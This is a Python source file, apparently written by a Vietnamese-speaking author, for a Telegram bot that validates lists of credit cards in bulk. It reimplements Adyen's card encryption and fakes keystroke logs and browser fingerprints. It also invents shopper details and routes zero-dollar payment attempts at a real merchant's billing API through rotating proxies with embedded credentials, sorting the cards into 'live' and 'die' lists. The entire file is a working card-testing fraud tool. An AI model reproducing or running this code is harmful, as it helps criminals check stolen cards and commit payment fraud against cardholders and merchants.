import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
from datetime import datetime
import io
import threading
import queue
import asyncio
import psutil

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request (PycURL)
import pycurl

# Thư viện Telegram Bot
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# Khởi tạo colorama (Dù chạy server không cần lắm nhưng giữ lại để debug console)
from colorama import Fore, init, Style
init(autoreset=True)

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    # Xử lý tháng
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    # Xử lý năm
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    """Kiểm tra thuật toán Luhn."""
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180)
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key")
        
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA", "kid": "asf-key", "e": encoded_part1, "n": encoded_part2, "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details")
    if not stripe_key:
        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain:
        domain = "https://www.mytheresa.com"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    card_number = format_card_number(card)
    fake_number_log = generate_fake_log(16)
    fake_cvc_log = generate_fake_log(3)

    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", "activate": "3", 
            "referrer": referrer, "numberFieldFocusCount": "1", "numberFieldLog": fake_number_log, 
            "numberFieldClickCount": "1", "numberFieldKeyCount": "16"
        },
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {
            "cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", 
            "referrer": referrer, "cvcFieldFocusCount": "1", "cvcFieldLog": fake_cvc_log, 
            "cvcFieldClickCount": "1", "cvcFieldKeyCount": "3", "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", "deactivate": "2"
        }
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

def generate_browser_profile():
    """
    Tạo User-Agent và Client Hints siêu random (Triệu tỉ tỉ cases).
    Hỗ trợ Windows, macOS, Linux với version Chrome thực tế.
    """
    
    # 1. Random Platform
    platforms = [
        {
            'os_name': 'Windows',
            'platform_header': '"Windows"',
            # Windows 10 hoặc 11 (NT 10.0 là chung cho cả 2)
            'ua_platform_part': 'Windows NT 10.0; Win64; x64'
        },
        {
            'os_name': 'macOS',
            'platform_header': '"macOS"',
            # Random versions từ Big Sur (11) đến Sonoma (14)
            'ua_platform_part': f'Macintosh; Intel Mac OS X 10_{random.randint(13, 15)}_{random.randint(1, 7)}'
        },
        {
            'os_name': 'Linux',
            'platform_header': '"Linux"',
            'ua_platform_part': 'X11; Linux x86_64'
        }
    ]
    
    # Tỉ lệ: 70% Windows, 20% Mac, 10% Linux
    chosen_os = random.choices(platforms, weights=[70, 20, 10], k=1)[0]
    
    # 2. Random Chrome Version (Major từ 120 đến 133, Build cực chi tiết)
    major_ver = random.randint(120, 133)
    build_minor = random.randint(0, 9)       # Ví dụ: .0
    build_patch = random.randint(1000, 6999) # Ví dụ: .6367
    build_tweak = random.randint(0, 255)     # Ví dụ: .91
    
    full_version_str = f"{major_ver}.{build_minor}.{build_patch}.{build_tweak}"
    
    # 3. Tạo User Agent String
    user_agent = f"Mozilla/5.0 ({chosen_os['ua_platform_part']}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{full_version_str} Safari/537.36"
    
    # 4. Tạo Client Hints (Sec-CH-UA) khớp với User Agent
    # Shuffle thứ tự các brand để tăng độ unique
    brands = [
        {"brand": "Not_A Brand", "version": "8"},
        {"brand": "Chromium", "version": str(major_ver)},
        {"brand": "Google Chrome", "version": str(major_ver)}
    ]
    random.shuffle(brands)
    
    sec_ch_ua_str = ", ".join([f'"{b["brand"]}";v="{b["version"]}"' for b in brands])
    
    return {
        "user_agent": user_agent,
        "sec_ch_ua": sec_ch_ua_str,
        "platform": chosen_os['platform_header']
    }

def generate_checkout_attempt_id():
    uuid_part = str(uuid.uuid4())
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 3: HÀM CHECK THẺ (CORE LOGIC)
# ===================================================================

def check_card_core(line_card):
    """
    Hàm xử lý logic check.
    Trả về: (Trạng thái (LIVE/DIE/ERROR), Message đã format, Time taken)
    """
    start_time = time.time()
    
    # Chuẩn hóa
    line_card = line_card.strip()
    normalized = normalize_card(line_card)
    
    if not normalized:
        end_time = time.time()
        return "ERROR", f"{line_card} - Format Error", end_time - start_time

    cc, mm, yyyy, cvc = normalized.split('|')

    if not validate_luhn(cc):
        end_time = time.time()
        return "ERROR", f"{cc}|{mm}|{yyyy}|{cvc} - Luhn Error", end_time - start_time

    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    data = {}
    max_retries = 20
    current_try = 0
    success_request = False

    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )
            profile = generate_browser_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = 'New York' 
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            attempt_id = generate_checkout_attempt_id()

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: en-US,en;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                f'sec-ch-ua: {profile["sec_ch_ua"]}',
                'sec-ch-ua-mobile: ?0',
                f'sec-ch-ua-platform: {profile["platform"]}',
                'origin: https://www.activecampaign.com',
                'pragma: no-cache',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')
            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            # Proxy Configuration
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            proxy_url = "http://aus.360s5.com:3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth = f"{base_auth}-session-{session_id}:{pass_auth}"
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)
            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')
            data = json.loads(response_text)
            success_request = True
            break
        except Exception as e:
            pass
        current_try += 1
        time.sleep(1)

    end_time = time.time()
    time_taken = end_time - start_time

    if not success_request:
        return "ERROR", f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NETWORK_FAIL|MAX_RETRIES", time_taken

    additionalData = data.get('additionalData', {})
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    if resultCode == "Authorised" or resultCode == "Cancelled":
        status = "LIVE"
        msg_str = "APPROVED ✅"
    elif resultCode == "Refused":
        status = "DIE"
        msg_str = f"DIE - {refusalReason}"
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        status = "DIE" # Coi như Die với bot auto
        msg_str = "3DS - 3D Secure required"
    else:
        status = "DIE"
        msg_str = f"UNK - {message if message != 'N/A' else resultCode}"

    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg_str}"
    
    return status, result_string, time_taken

# ===================================================================
# === PHẦN 4: TELEGRAM BOT HANDLERS
# ===================================================================

# Global Stats Storage (Đơn giản hóa cho single instance)
task_info = {
    "total": 0,
    "checked": 0,
    "live": 0,
    "die": 0,
    "error": 0,
    "start_time": 0,
    "is_running": False,
    "live_list": [],
    "die_list": []
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Chào bạn!\n\n"
        "1. Gửi file `.txt` chứa list thẻ để check (100 luồng).\n"
        "2. Dùng lệnh `/st cc|mm|yyyy|cvv` để check lẻ."
    )

async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /st"""
    args = context.args
    if not args:
        await update.message.reply_text("⚠️ Vui lòng nhập thẻ: `/st cc|mm|yyyy|cvv`", parse_mode="Markdown")
        return

    card_input = args[0]
    await update.message.reply_text(f"🔄 Đang check thẻ: {card_input} ...")

    # Chạy hàm blocking trong thread pool mặc định để không chặn bot
    loop = asyncio.get_running_loop()
    status, result, taken = await loop.run_in_executor(None, check_card_core, card_input)

    # Format output
    result_with_time = f"{result}|Time: {taken:.2f}s"
    
    if status == "LIVE":
        icon = "✅"
    elif status == "DIE":
        icon = "❌"
    else:
        icon = "⚠️"

    reply_msg = f"{icon} **{status}**\n`{result_with_time}`"
    await update.message.reply_text(reply_msg, parse_mode="Markdown")

def worker_thread(q):
    """Thread worker xử lý queue."""
    while True:
        card = q.get()
        if card is None:
            break
        
        try:
            status, result, taken = check_card_core(card)
            result_final = f"{result}|Time: {taken:.2f}s"

            if status == "LIVE":
                task_info["live"] += 1
                task_info["live_list"].append(result_final)
            elif status == "DIE":
                task_info["die"] += 1
                task_info["die_list"].append(result_final)
            else:
                task_info["error"] += 1
            
            task_info["checked"] += 1
            
        except Exception:
            task_info["error"] += 1
            task_info["checked"] += 1
        finally:
            q.task_done()

async def update_status_message(context: ContextTypes.DEFAULT_TYPE):
    """Cập nhật tin nhắn trạng thái mỗi 1-2s."""
    job_data = context.job.data
    chat_id = job_data['chat_id']
    message_id = job_data['message_id']
    
    if not task_info["is_running"]:
        return

    elapsed = time.time() - task_info["start_time"]
    if elapsed <= 0: elapsed = 1
    
    # Tính CPM
    cpm = int((task_info["checked"] / elapsed) * 60)
    
    # System Stats
    cpu_usage = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent
    
    text = (
        f"⚡ **Checking Process** ⚡\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Total: `{task_info['total']}`\n"
        f"Checked: `{task_info['checked']}`\n"
        f"✅ Live: `{task_info['live']}`\n"
        f"❌ Die: `{task_info['die']}`\n"
        f"⚠️ Error: `{task_info['error']}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🚀 CPM: `{cpm}`\n"
        f"🖥 CPU: `{cpu_usage}%` | RAM: `{ram_usage}%`\n"
        f"⏱ Time: `{int(elapsed)}s`"
    )

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            parse_mode="Markdown"
        )
    except Exception as e:
        # Bỏ qua lỗi nếu message chưa thay đổi hoặc quá limit
        pass

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý file user gửi lên."""
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("⚠️ Vui lòng gửi file .txt")
        return

    # Reset task info
    task_info["total"] = 0
    task_info["checked"] = 0
    task_info["live"] = 0
    task_info["die"] = 0
    task_info["error"] = 0
    task_info["live_list"] = []
    task_info["die_list"] = []
    task_info["is_running"] = True
    task_info["start_time"] = time.time()

    file = await context.bot.get_file(document.file_id)
    content_byte = await file.download_as_bytearray()
    
    # Decode file content
    try:
        content_str = content_byte.decode('utf-8')
    except:
        content_str = content_byte.decode('latin-1')

    cards = [line.strip() for line in content_str.splitlines() if line.strip()]
    task_info["total"] = len(cards)

    if not cards:
        await update.message.reply_text("⚠️ File rỗng.")
        return

    msg = await update.message.reply_text("🚀 Đang khởi động 100 luồng...")
    
    # Queue Setup
    q = queue.Queue()
    num_threads = 100
    threads = []
    
    for _ in range(num_threads):
        t = threading.Thread(target=worker_thread, args=(q,))
        t.start()
        threads.append(t)
        
    for card in cards:
        q.put(card)

    # Start Timer Job (Update mỗi 1.5s để tránh flood limit)
    context.job_queue.run_repeating(
        update_status_message, 
        interval=1.5, 
        first=1, 
        data={'chat_id': update.message.chat_id, 'message_id': msg.message_id},
        name="status_update"
    )

    # Wait for completion (blocking but in async wrapper check)
    # Vì q.join() là blocking, ta chạy nó trong executor
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, q.join)

    # Stop workers
    for _ in range(num_threads):
        q.put(None)
    for t in threads:
        await loop.run_in_executor(None, t.join)

    # Stop Timer
    jobs = context.job_queue.get_jobs_by_name("status_update")
    for job in jobs:
        job.schedule_removal()
    
    task_info["is_running"] = False
    
    # Final Update Message
    await update_status_message(context) # Update lần cuối
    await update.message.reply_text("✅ **Hoàn thành!** Đang gửi file kết quả...", parse_mode="Markdown")

    # Send Result Files
    if task_info["live_list"]:
        live_content = "\n".join(task_info["live_list"])
        await update.message.reply_document(
            document=InputFile(io.BytesIO(live_content.encode('utf-8')), filename="Live_Cards.txt"),
            caption=f"✅ {len(task_info['live_list'])} Live Cards"
        )
    
    if task_info["die_list"]:
        # Chỉ gửi file Die nếu user cần, thường file die rất nặng
        die_content = "\n".join(task_info["die_list"])
        await update.message.reply_document(
            document=InputFile(io.BytesIO(die_content.encode('utf-8')), filename="Die_Cards.txt"),
            caption=f"❌ {len(task_info['die_list'])} Die Cards"
        )

# ===================================================================
# === MAIN BOT
# ===================================================================

if __name__ == '__main__':
    # THAY TOKEN CỦA BẠN VÀO ĐÂY
    TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
    
    print(f"{Fore.GREEN}[BOT] Bot started...")
    
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("st", check_single_card))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_document))
    
    app.run_polling()
